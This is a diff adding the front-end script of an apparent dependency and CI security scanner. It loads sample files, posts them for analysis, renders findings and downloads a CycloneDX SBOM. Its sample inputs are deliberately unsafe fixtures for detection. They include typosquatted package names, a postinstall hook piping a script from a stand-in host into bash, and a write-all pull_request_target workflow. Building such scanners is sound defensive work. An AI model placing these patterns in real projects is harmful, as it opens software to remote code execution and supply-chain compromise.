@@ -1,0 +1,14 @@
+const $=id=>document.getElementById(id);
+const samples={
+ "requirements.txt":"requests==2.31.0\nreqeusts==1.0.0\nflask>=2.0\ncolorama",
+ "package.json":JSON.stringify({name:"demo-app",dependencies:{express:"^4.18.2",lodahs:"^1.0.0",react:"18.2.0"},scripts:{postinstall:"curl https://example.invalid/install.sh | bash"}},null,2),
+ "package-lock.json":JSON.stringify({lockfileVersion:3,packages:{"":{name:"demo",version:"1.0.0"},"node_modules/express":{version:"4.18.2"},"node_modules/lodahs":{version:"1.0.0"}}},null,2),
+ "workflow.yml":"name: CI\non: pull_request_target\njobs:\n  build:\n    permissions: write-all\n    steps:\n      - uses: actions/checkout@main"
+};
+let lastPayload=null;
+$("kind").addEventListener("change",()=>{$("source").value=samples[$("kind").value]});
+$("sample").onclick=()=>{$("source").value=samples[$("kind").value]};
+$("analyze").onclick=async()=>{const filename=$("kind").value;lastPayload={filename,content:$("source").value};$("state").textContent="ANALYZING";try{const r=await fetch("/api/analyze",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(lastPayload)});const data=await r.json();if(!r.ok)throw Error(data.detail||"Analysis failed");render(data);$("state").textContent="COMPLETE"}catch(e){$("state").textContent="ERROR";$("list").innerHTML='<p class="empty">'+escapeHtml(e.message)+'</p>'}};
+$("sbom").onclick=async()=>{if(!lastPayload){$("analyze").click();return}const r=await fetch("/api/sbom",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(lastPayload)});const data=await r.json();$("output").hidden=false;$("output").textContent=JSON.stringify(data,null,2);const blob=new Blob([JSON.stringify(data,null,2)],{type:"application/json"});const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="sbom.cyclonedx.json";a.click();URL.revokeObjectURL(a.href)};
+function escapeHtml(s){return String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]))}
+function render(d){const s=d.summary;$("components").textContent=s.components;$("findings").textContent=s.findings;$("score").textContent=s.risk_score+"/100";const order=["critical","high","medium","low","info"];const max=Math.max(1,...order.map(k=>s.severity[k]));$("bars").innerHTML=order.map(k=>'<div class="bar"><span>'+k.toUpperCase()+'</span><div class="track"><div class="fill '+k+'" style="width:'+(s.severity[k]/max*100)+'%"></div></div><span>'+s.severity[k]+'</span></div>').join("");$("list").innerHTML=d.findings.length?d.findings.map(f=>'<article class="finding"><span class="tag '+f.severity+'">'+f.severity.toUpperCase()+'</span><b>'+escapeHtml(f.rule_id+' · '+f.title)+'</b><p>'+escapeHtml(f.description)+'</p><p><strong>Evidence:</strong> '+escapeHtml(f.evidence)+'<br><strong>Remediation:</strong> '+escapeHtml(f.recommendation)+'</p></article>').join(""):'<p class="empty">No heuristic findings detected for this input.</p>'}
